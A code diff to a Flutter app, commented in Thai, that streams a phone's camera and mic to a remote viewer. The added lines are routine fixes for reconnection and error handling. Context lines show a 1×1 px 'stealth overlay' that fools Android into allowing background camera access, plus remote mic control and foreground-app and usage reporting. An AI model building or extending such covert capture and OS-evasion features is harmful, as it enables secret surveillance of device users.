@@ -51,6 +51,9 @@ class _StreamingScreenState extends State<StreamingScreen> {
   // mic เริ่มต้นปิด (privacy) — viewer toggle ผ่าน socket event
   bool _micEnabled = false;
 
+  // guard กัน factory-reset เรียกซ้ำ (เช่น viewer double-tap)
+  bool _resetting = false;
+
   @override
   void initState() {
     super.initState();
@@ -75,6 +78,7 @@ class _StreamingScreenState extends State<StreamingScreen> {
     _signaling.onToggleMic = _onToggleMic;
     _signaling.onFetchUsageStats = _reportUsageStatsOnce;
     _signaling.onFactoryReset = _onFactoryReset;
+    _signaling.onReconnect = _onSignalingReconnect;
 
     // viewer push config มา → save ลง SharedPreferences (apply รอบหน้าตอน start FGS)
     _signaling.onConfigPushed = (json) async {
@@ -102,10 +106,23 @@ class _StreamingScreenState extends State<StreamingScreen> {
 
     // เริ่ม foreground service ก่อน getUserMedia (พร้อม custom notif text)
     // (Android 14+ บังคับ: ต้องมี FGS ก่อนถึงจะเข้าถึงกล้อง background ได้)
-    await ForegroundService.start(
+    final fgsOk = await ForegroundService.start(
       notifTitle: config.notifTitle,
       notifBody: config.notifBody,
     );
+    if (!fgsOk) {
+      // permission ขาด / SecurityException → หยุดเลย ไม่ให้ getUserMedia
+      if (!mounted) return;
+      setState(() => _status = 'เริ่มกล้องไม่สำเร็จ — เช็คสิทธิ์กล้อง/ไมค์');
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(
+          content: Text('ไม่สามารถเริ่ม service ได้ — กรุณาเปิดสิทธิ์กล้อง/ไมโครโฟน'),
+          backgroundColor: Colors.red,
+          duration: Duration(seconds: 4),
+        ),
+      );
+      return;
+    }
 
     // เริ่ม 1×1 px stealth overlay (เทคนิค AirDroid) — หลอกระบบว่า app foreground
     // ทำให้กล้องเข้าถึงได้แม้ user lock screen / สลับไป app อื่น
@@ -121,6 +138,11 @@ class _StreamingScreenState extends State<StreamingScreen> {
       'video': {'facingMode': 'environment'},
       'audio': true,
     });
+    // กัน setState หลัง dispose: ถ้า user back ระหว่าง getUserMedia → cleanup เลย
+    if (!mounted) {
+      _localStream?.dispose();
+      return;
+    }
     // ปิด mic ทันที — track ยังอยู่แต่ไม่มี audio data
     for (final track in _localStream!.getAudioTracks()) {
       track.enabled = _micEnabled; // false ใน init
@@ -131,6 +153,7 @@ class _StreamingScreenState extends State<StreamingScreen> {
     // join signaling room ด้วย device_id (ไม่ใช่ pair code 6 หลัก)
     // — pair code เป็นแค่ค่าให้ viewer แลกครั้งแรก หลังจากนั้น viewer จะใช้ device_id ตรงๆ
     _signaling.joinRoom(deviceId);
+    if (!mounted) return;
     setState(() => _status = 'รอผู้ดูเชื่อมต่อ...');
 
     // เริ่ม status reporter — รายงาน battery/signal/foreground app ทุก 30s
@@ -247,6 +270,21 @@ class _StreamingScreenState extends State<StreamingScreen> {
     debugPrint('[streaming] mic ${enabled ? "ON" : "OFF"}');
   }
 
+  /// socket reconnect — re-register camera + re-join room
+  /// (server ลบ state เมื่อ disconnect, ดังนั้นต้อง register ใหม่)
+  Future<void> _onSignalingReconnect() async {
+    final id = _deviceId;
+    if (id == null) return;
+    debugPrint('[streaming] re-register-camera + re-join room after reconnect');
+    final fcmToken = await FcmService.getToken();
+    _signaling.registerCamera(
+      deviceId: id,
+      code: widget.code,
+      fcmToken: fcmToken,
+    );
+    _signaling.joinRoom(id);
+  }
+
   /// อ่าน usage stats จาก native + ส่งให้ server (no-op ถ้ายังไม่ grant permission)
   Future<void> _reportUsageStatsOnce() async {
     final id = _deviceId;
@@ -267,6 +305,11 @@ class _StreamingScreenState extends State<StreamingScreen> {
   /// - stop FGS + stealth overlay (กล้องหยุดสตรีม)
   /// - navigate กลับ HomeScreen แสดง pair UI
   Future<void> _onFactoryReset() async {
+    if (_resetting) {
+      debugPrint('[streaming] factory-reset already in progress — ignore');
+      return;
+    }
+    _resetting = true;
     debugPrint('[streaming] factory-reset received');
     await StreamingPrefs.disable();
     await StreamingPrefs.setStealthMode(false);
